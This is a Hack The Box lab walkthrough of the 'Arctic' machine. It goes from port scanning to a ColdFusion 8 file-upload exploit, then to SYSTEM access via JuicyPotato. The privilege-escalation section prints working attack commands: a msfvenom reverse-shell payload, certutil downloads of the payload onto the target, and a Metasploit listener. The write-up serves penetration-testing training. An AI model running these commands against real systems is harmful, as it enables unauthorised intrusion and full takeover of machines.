# Arctic - Hack The Box Walkthrough

**Target IP**: `10.10.10.11`  
**Hostname**: `arctic.htb`  

---

## Initial Setup

### Preparing the Environment
1. Store the target IP in a file for reuse:
   ```bash
   echo 10.10.10.11 > target
   ```
2. Add the target to your `/etc/hosts` file for easier navigation:
   ```
   10.10.10.11   arctic.htb
   ```

---

## Enumeration

### Full Port Scan
I conducted a full TCP port scan to identify open ports:
```bash
nmap -p- -v -iL target -oN nmap/full_tcp_scan.txt
```

**Open Ports**:
- 135/tcp - MSRPC
- 8500/tcp - HTTP (ColdFusion)
- 49154/tcp - MSRPC  

### Service Enumeration
Next, I performed a targeted scan on the discovered ports to gather detailed information:
```bash
nmap -p135,8500,49154 -v -iL target -A -oN nmap/target_ports_scan.txt -oX nmap/target_ports_scan.xml
```

Unfortunately, the Nmap scan provided limited details. Testing ports manually with `telnet` and `nc` also yielded no additional information.

---

## HTTP on Port 8500

Accessing the web server at `http://arctic.htb:8500/` revealed an administrative login page located at:  
`http://arctic.htb:8500/CFIDE/administrator/`

The page identified the software as **Adobe ColdFusion 8**.

![image](https://github.com/user-attachments/assets/965b6200-8bc6-4a63-94c1-deb76a96ca6e)

---

## Exploitation

### Identifying Vulnerability
I searched for known vulnerabilities in Adobe ColdFusion 8:
```bash
searchsploit Adobe ColdFusion 8
```

**Result**:
I discovered an exploit for **ColdFusion 8 Arbitrary File Upload**:  
```text
ColdFusion 8 - Arbitrary File Upload | 50057
```

I extracted the exploit using:
```bash
searchsploit -m 50057
```

![image](https://github.com/user-attachments/assets/1fe12b8e-0136-423b-925b-93fe40f8aebd)

### Modifying the Exploit
The exploit script needed configuration changes to target the Arctic machine:

![Screenshot from 2024-12-12 20-53-54](https://github.com/user-attachments/assets/1215ff26-65bb-4934-b60b-99af9f7f9474)

### Obtaining a Shell
Then run the python script:
```bash
python3 50057.py
```

![image](https://github.com/user-attachments/assets/0ad09701-8968-4c4c-9f45-80530f2a3e6b)

**Outcome**: Obtained a reverse shell on the Arctic machine 

---

## Privilege Escalation

### 1. Token Impersonation via JuicyPotato
#### Initial Findings
Checking privileges revealed `SeImpersonatePrivilege` enabled:
```bash
whoami /priv
```

#### Exploitation
1. **Download JuicyPotato** on your local machine:
   ```bash
   wget "https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe"
   ```
2. **Generate a Meterpreter Reverse Shell**:
   ```bash
   msfvenom -p windows/meterpreter/reverse_tcp LHOST=<your_IP> LPORT=8887 -f exe -o shell.exe
   ```
3. **Start a Web Server**:
   ```bash
   python3 -m http.server 8081
   ```
4. **Transfer Exploits to the Target**:
   ```bash
   cd %TEMP%
   certutil -UrlCache -f http://<IP>:8081/JuicyPotato.exe JuicyPotato.exe
   certutil -UrlCache -f http://<IP>:8081/shell.exe shell.exe
   ```
5. **Start Listener**:
   ```bash
   msfconsole
   use exploit/multi/handler
   set PAYLOAD windows/meterpreter/reverse_tcp
   set LHOST <your_IP>
   set LPORT 8887
   run
   ```
6. **Run JuicyPotato**:
   ```bash
   .\JuicyPotato.exe -t * -p shell.exe -l 443
   ```

**Outcome**: Obtained a Meterpreter session with `NT AUTHORITY\SYSTEM` privileges.

---

## Summary

1. Identified **Adobe ColdFusion 8** running on port 8500.
2. Exploited an **arbitrary file upload vulnerability** to gain a foothold.
3. Used JuicyPotato to escalate privileges to SYSTEM.

---

## Resources

- [Adobe ColdFusion 8 - Remote Command Execution (RCE)](https://www.exploit-db.com/exploits/50057)
- [JuicyPotato](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/juicypotato)
- [Windows Privilege Escalation — Token Impersonation (SeImpersonatePrivilege)](https://usersince99.medium.com/windows-privilege-escalation-token-impersonation-seimpersonateprivilege-364b61017070)
- [WinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS)

---
